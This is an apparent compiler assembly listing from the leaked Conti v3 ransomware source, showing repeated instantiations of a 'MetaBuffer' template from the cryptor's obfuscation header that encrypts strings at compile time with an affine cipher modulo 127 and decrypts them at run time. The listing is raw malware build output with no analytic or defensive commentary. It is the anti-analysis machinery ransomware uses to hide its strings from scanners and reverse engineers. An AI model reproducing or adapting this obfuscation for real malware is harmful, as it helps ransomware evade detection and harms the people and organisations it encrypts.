;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 4c	 sub	 ecx, 76			; 0000004cH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2d	 mov	 BYTE PTR [rcx+1], 45	; 0000002dH
  00007	c6 41 02 4c	 mov	 BYTE PTR [rcx+2], 76	; 0000004cH
  0000b	c6 41 03 01	 mov	 BYTE PTR [rcx+3], 1
  0000f	c6 41 04 4c	 mov	 BYTE PTR [rcx+4], 76	; 0000004cH
  00013	c6 41 05 37	 mov	 BYTE PTR [rcx+5], 55	; 00000037H
  00017	c6 41 06 4c	 mov	 BYTE PTR [rcx+6], 76	; 0000004cH
  0001b	c6 41 07 29	 mov	 BYTE PTR [rcx+7], 41	; 00000029H
  0001f	c6 41 08 4c	 mov	 BYTE PTR [rcx+8], 76	; 0000004cH
  00023	c6 41 09 4c	 mov	 BYTE PTR [rcx+9], 76	; 0000004cH
  00027	c6 41 0a 4c	 mov	 BYTE PTR [rcx+10], 76	; 0000004cH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 27	 sub	 ecx, 39			; 00000027H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 64	 mov	 BYTE PTR [rcx+1], 100	; 00000064H
  00007	c6 41 02 27	 mov	 BYTE PTR [rcx+2], 39	; 00000027H
  0000b	c6 41 03 23	 mov	 BYTE PTR [rcx+3], 35	; 00000023H
  0000f	c6 41 04 27	 mov	 BYTE PTR [rcx+4], 39	; 00000027H
  00013	c6 41 05 12	 mov	 BYTE PTR [rcx+5], 18
  00017	c6 41 06 27	 mov	 BYTE PTR [rcx+6], 39	; 00000027H
  0001b	c6 41 07 37	 mov	 BYTE PTR [rcx+7], 55	; 00000037H
  0001f	c6 41 08 27	 mov	 BYTE PTR [rcx+8], 39	; 00000027H
  00023	c6 41 09 27	 mov	 BYTE PTR [rcx+9], 39	; 00000027H
  00027	c6 41 0a 27	 mov	 BYTE PTR [rcx+10], 39	; 00000027H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GN@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1e 00 00 00	 mov	 eax, 30
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6c	 mov	 BYTE PTR [rcx+1], 108	; 0000006cH
  00007	c6 41 02 1e	 mov	 BYTE PTR [rcx+2], 30
  0000b	c6 41 03 68	 mov	 BYTE PTR [rcx+3], 104	; 00000068H
  0000f	c6 41 04 1e	 mov	 BYTE PTR [rcx+4], 30
  00013	c6 41 05 38	 mov	 BYTE PTR [rcx+5], 56	; 00000038H
  00017	c6 41 06 1e	 mov	 BYTE PTR [rcx+6], 30
  0001b	c6 41 07 19	 mov	 BYTE PTR [rcx+7], 25
  0001f	c6 41 08 1e	 mov	 BYTE PTR [rcx+8], 30
  00023	c6 41 09 1e	 mov	 BYTE PTR [rcx+9], 30
  00027	c6 41 0a 1e	 mov	 BYTE PTR [rcx+10], 30
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 07	 sub	 ecx, 7

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 73	 mov	 BYTE PTR [rcx+1], 115	; 00000073H
  00007	c6 41 02 07	 mov	 BYTE PTR [rcx+2], 7
  0000b	c6 41 03 02	 mov	 BYTE PTR [rcx+3], 2
  0000f	c6 41 04 07	 mov	 BYTE PTR [rcx+4], 7
  00013	c6 41 05 2f	 mov	 BYTE PTR [rcx+5], 47	; 0000002fH
  00017	c6 41 06 07	 mov	 BYTE PTR [rcx+6], 7
  0001b	c6 41 07 40	 mov	 BYTE PTR [rcx+7], 64	; 00000040H
  0001f	c6 41 08 07	 mov	 BYTE PTR [rcx+8], 7
  00023	c6 41 09 07	 mov	 BYTE PTR [rcx+9], 7
  00027	c6 41 0a 07	 mov	 BYTE PTR [rcx+10], 7
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 36 00 00 00	 mov	 eax, 54			; 00000036H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GF@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
